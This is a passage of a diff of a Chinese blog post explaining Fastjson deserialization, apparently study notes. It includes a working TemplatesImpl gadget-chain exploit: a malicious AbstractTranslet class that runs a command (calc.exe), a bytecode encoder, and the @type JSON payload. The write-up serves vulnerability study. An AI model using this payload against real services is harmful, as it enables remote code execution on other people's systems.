+<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> JSON.toJSONString(user); </span><br><span class="line">System.out.println(serializedStr);</span><br><span class="line"><span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> JSON.parse(serializedStr); </span><br><span class="line">System.out.println(<span class="string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName()); System.out.println(<span class="string">&quot;parse反序列化:&quot;</span>+obj1);</span><br><span class="line"><span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parseObject(serializedStr); </span><br><span class="line">System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName()); System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span>+obj2);</span><br><span class="line"><span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> JSON.parseObject(serializedStr,User.class); </span><br><span class="line">System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName()); System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span>+obj3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//@type</span></span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">System.out.println(serializedStr);</span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(serializedStr1);</span><br><span class="line">System.out.println(JSON.parse(serializedStr).getClass().toString());</span><br><span class="line">System.out.println(JSON.parse(serializedStr1).getClass().toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">有参构造</span><br><span class="line">getId</span><br><span class="line">getName&#123;<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">无参构造</span><br><span class="line">setId</span><br><span class="line">setName</span><br><span class="line">parseObject反序列化对象名称:com.example.fastjson.User</span><br><span class="line">parseObject反序列化:User&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, id=<span class="number">12</span>&#125;</span><br><span class="line"><span class="comment">//@type</span></span><br><span class="line">getId</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">getId</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.fastjson.User&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.alibaba.fastjson.JSONObject</span><br><span class="line">无参构造</span><br><span class="line">setId</span><br><span class="line">setName</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.example.fastjson.User</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>总结：</p>
@@ -334,13 +567,13 @@
 <li>指定@type时，parse只会调用<strong>构造方法</strong>和特定setter，而parseObject会额外调用getter</li>
 </ul>
 </blockquote>
-<h3 id="public-x2F-private属性区别"><a href="#public-x2F-private属性区别" class="headerlink" title="public&#x2F;private属性区别"></a>public&#x2F;private属性区别</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-comment">//属性</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">private</span> String full_name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean sex;<br>    <span class="hljs-keyword">private</span> Properties prop; <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person构造函数&quot;</span>); &#125;<br>    <span class="hljs-comment">//set</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-comment">//get 返回Boolean</span><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getSex()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.sex;<br>    &#125;<br>    <span class="hljs-comment">//get 返回ProPerties</span><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProp</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getProp()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.prop;<br>    &#125;<br>    <span class="hljs-comment">//在输出时会自动调用的对象ToString函数 </span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[Person Object] name=&quot;</span> + <span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot; full_name=&quot;</span> +<br>            <span class="hljs-built_in">this</span>.full_name  + <span class="hljs-string">&quot;, age=&quot;</span> + <span class="hljs-built_in">this</span>.age + <span class="hljs-string">&quot;, prop=&quot;</span> + <span class="hljs-built_in">this</span>.prop + <span class="hljs-string">&quot;, sex=&quot;</span> +<br>            <span class="hljs-built_in">this</span>.sex;<br>        <span class="hljs-keyword">return</span> s; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="public-x2F-private属性区别"><a href="#public-x2F-private属性区别" class="headerlink" title="public&#x2F;private属性区别"></a>public&#x2F;private属性区别</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop; <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person构造函数&quot;</span>); &#125;</span><br><span class="line">    <span class="comment">//set</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge()&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProp</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProp()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在输出时会自动调用的对象ToString函数 </span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;[Person Object] name=&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot; full_name=&quot;</span> +</span><br><span class="line">            <span class="built_in">this</span>.full_name  + <span class="string">&quot;, age=&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;, prop=&quot;</span> + <span class="built_in">this</span>.prop + <span class="string">&quot;, sex=&quot;</span> +</span><br><span class="line">            <span class="built_in">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>测试序列化与反序列化</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">eneity3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson.Person\&quot;,\&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;<br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eneity3,Person.class); <span class="hljs-comment">//输出会调用obj对象的toString函数</span><br>System.out.println(obj);    <br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">eneity3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson.Person\&quot;,\&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(eneity3,Person.class); <span class="comment">//输出会调用obj对象的toString函数</span></span><br><span class="line">System.out.println(obj);    </span><br></pre></td></tr></table></figure></div>
 
 <p>输出结果</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Person构造函数<br>setAge()<br>getProp()<br>[Person Object] name=zhang full_name=<span class="hljs-literal">null</span>, age=<span class="hljs-number">18</span>, prop=<span class="hljs-literal">null</span>, sex=<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=zhang full_name=<span class="literal">null</span>, age=<span class="number">18</span>, prop=<span class="literal">null</span>, sex=<span class="literal">null</span></span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>从结果来看，成功通过反序列化赋值的属性只有name和age，而其中name因为是public因此可以直接赋值，full_name、sex、prop等private属性因为没有设置setter因此也赋值失败，age虽为private属性，但<code>public void setAge(int age)</code>被调用成功，因此被赋值</p>
@@ -351,7 +584,12 @@
 <li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li>
 </ul>
 </blockquote>
-<h3 id="parse过程"><a href="#parse过程" class="headerlink" title="parse过程"></a>parse过程</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241845.png" srcset="/img/loading.gif" lazyload alt="image-20230810202238068"></p>
+<h3 id="parse过程"><a href="#parse过程" class="headerlink" title="parse过程"></a>parse过程</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241845.png"
+                      alt="image-20230810202238068"
+                ></p>
 <h4 id="该过程中调用的setter方法要求"><a href="#该过程中调用的setter方法要求" class="headerlink" title="该过程中调用的setter方法要求"></a>该过程中调用的setter方法要求</h4><ul>
 <li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
 <li>非静态方法</li>
@@ -379,56 +617,96 @@
 <p>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private 属性，服务端必须添加特性才回去从json中恢复private属性的数据。</p>
 </blockquote>
 <p>总体来说是直接反序列化TemplatesImpl,由于存在 Feature.SupportNonPublicField 设置(允许private对象传入)，反序列化的过程中会调用setValue，这里会把所有属性存储到filedInfo中，到outputProperties的时候，因为它是个类，存在 method，于是进入if分支，调用方法为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241981.png" srcset="/img/loading.gif" lazyload alt="image-20230810204820756"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241981.png"
+                      alt="image-20230810204820756"
+                ></p>
 <p>之后会调用newTransformer()</p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241346.png" srcset="/img/loading.gif" lazyload alt="image-20230810204854867"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241715.png" srcset="/img/loading.gif" lazyload alt="image-20230810204903707"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241200.png" srcset="/img/loading.gif" lazyload alt="image-20230810204916936"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241346.png"
+                      alt="image-20230810204854867"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241715.png"
+                      alt="image-20230810204903707"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032241200.png"
+                      alt="image-20230810204916936"
+                ></p>
 <blockquote>
 <p>最后就是初始化类进而代码执行了</p>
 </blockquote>
 <h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>恶意类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Shell</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>&#125; &#125;<br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span><br>TransletException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>&#125; &#125;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Shell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">&#125; &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span></span><br><span class="line">TransletException &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>工具类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">FiletoBase64</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(filename);<br>    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">io</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10240</span>];<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-keyword">while</span> ((len = io.read(buf)) &gt; <span class="hljs-number">0</span>) &#123;<br>        os.write(buf, <span class="hljs-number">0</span>, len);<br>    &#125;<br>    io.close();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());<br><span class="hljs-keyword">return</span> s; &#125;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">FiletoBase64</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">io</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10240</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len = io.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">    &#125;</span><br><span class="line">    io.close();</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());</span><br><span class="line"><span class="keyword">return</span> s; &#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>payload</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> ClassBase64Util.FiletoBase64(<span class="hljs-string">&quot;./Shell.class&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="hljs-string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;<br>System.out.println(payload1);<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);<br>System.out.println(obj);<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> ClassBase64Util.FiletoBase64(<span class="string">&quot;./Shell.class&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">payload1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(payload1);</span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a><strong>JdbcRowSetImpl利用链</strong></h3><p>利用链分析:在设置AutoCommit属性时，调用setAutoCommit()方法，conn默认为空，进入else执行this.conn &#x3D; this.connect();</p>
